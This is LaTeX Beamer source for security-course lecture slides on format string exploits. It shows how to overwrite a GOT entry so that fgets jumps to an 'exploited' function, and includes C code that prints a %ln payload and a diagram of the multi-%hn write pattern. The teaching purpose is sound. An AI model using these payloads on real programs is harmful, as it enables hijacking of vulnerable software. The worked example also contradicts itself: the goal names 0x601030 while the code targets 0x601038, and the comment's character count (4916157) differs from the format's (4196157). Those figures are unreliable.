\usetikzlibrary{calc,fit,positioning}

\begin{frame}[fragile,label=formatGOT]{format string overwrite: GOT}
\lstset{
    language={},
    style=smaller
}
\begin{lstlisting}
0000000000400580 <fgets@plt>:
  400580:       ff 25 9a 0a 20 00       jmpq   *0x200a9a(%rip)
        # 601038 <_GLOBAL_OFFSET_TABLE_+0x30>
`\textit{\ldots}`

0000000000400706 <exploited>:
...
\end{lstlisting}
    \begin{itemize}
        \item goal: replace \texttt{0x601030} (pointer to \texttt{fgets}) \\
              with \texttt{0x400726} (pointer to \texttt{exploited})
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=formatExample]{format string overwrite: setup}
\lstset{
    language=C,
    style=smaller,
}
\begin{lstlisting}
    /* advance through 5 registers, then
     * 5 * 8 = 40 bytes down stack, outputting
     * 4916157 + 9 characters before using 
     * %ln to store a long.
     */
    fputs("%c%c%c%c%c%c%c%c%c%.4196157u%ln", stdout);
    /* include 5 bytes of padding to make current location
     * in buffer match where on the stack printf will be reading.
     */
    fputs("?????", stdout);
    void *ptr = (void*) 0x601038;
    /* write pointer value, which will include \0s */
    fwrite(&ptr, 1, sizeof(ptr), stdout);
    fputs("\n", stdout);
\end{lstlisting}
\end{frame}

\begin{frame}{demo}
    \begin{itemize}
        \item but millions of characters of junk output?
        \item can do better --- write value in multiple pieces
            \begin{itemize}
            \item use multiple \%n
            \end{itemize}
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=exploitPattern]{format string exploit pattern (x86-64)}
    \begin{itemize}
        \item write {\tt 1000} (short) to address {\tt 0x1234567890ABCDEF}
        \item write {\tt 2000} (short) to address {\tt 0x1234567890ABCDF1}
        \item buffer starts 16 bytes above printf return address
    \end{itemize}
\begin{tikzpicture}
    \tikzset{
        mylabel/.style={
            draw,red,ultra thick,inner sep=0.5mm,label={[red!70!black,fill=white]#1}
        }
    }
    \begin{scope}
    \tikzset{
        every node/.style={font=\tt\small,inner sep=0.1mm},
    }
    \node (skipRegs) {\%c\%c\%c\%c\%c};
    \node[right=0cm of skipRegs](skipStack) {\%c\%c\%c\%c};
    \node[right=0cm of skipStack] (chooseNumber) {\%.991u};
    \node[right=0cm of chooseNumber] (writeValue) {\%hn};
    \node[right=0cm of writeValue] (chooseNumber2) {\%.1000u};
    \node[right=0cm of chooseNumber2] (writeValue2) {\%hn};
    \node[right=0cm of writeValue2] (dots) {\ldots};

    \node[below=1cm of writeValue](pointer) {\verb|\x12\x34\x56\x78\x90\xAB\xCD\xEF|};
    \node[left=0cm of pointer] (dots2) {\ldots};
    \node[below=0cm of pointer](pointer2) {\verb|\x12\x34\x56\x78\x90\xAB\xCD\xF1|};
    \end{scope}

    \begin{visibleenv}<2>
        \node[fit=(skipRegs),mylabel={skip over registers}] {};
    \end{visibleenv}
    \begin{visibleenv}<3>
        \node[fit=(skipStack) (chooseNumber),mylabel={{skip to format string buffer, past format part}}] {};
    \end{visibleenv}
    \begin{visibleenv}<4>
        \node[fit={(chooseNumber)},mylabel={9 + 991 chars is 1000}] {};
    \end{visibleenv}
    \begin{visibleenv}<5>
        \node[fit={(writeValue)},mylabel={write to first pointer}] {};
    \end{visibleenv}
    \begin{visibleenv}<6>
        \node[fit={(chooseNumber2)},mylabel={1000 + 1000 = 2000}] {};
    \end{visibleenv}
    \begin{visibleenv}<7>
        \node[fit={(writeValue2)},mylabel={write to second pointer}] {};
    \end{visibleenv}
    % FIXME: annotate these
\end{tikzpicture}
\end{frame}


\begin{frame}{format string assignment}
    \begin{itemize}
        \item released Friday
        \item one week
        \item good global variable to target
            \begin{itemize}
                \item to keep it simple/consistently working
                \item more realistic: target GOT entry and use return oriented programming (later)
            \end{itemize}
    \end{itemize}
\end{frame}
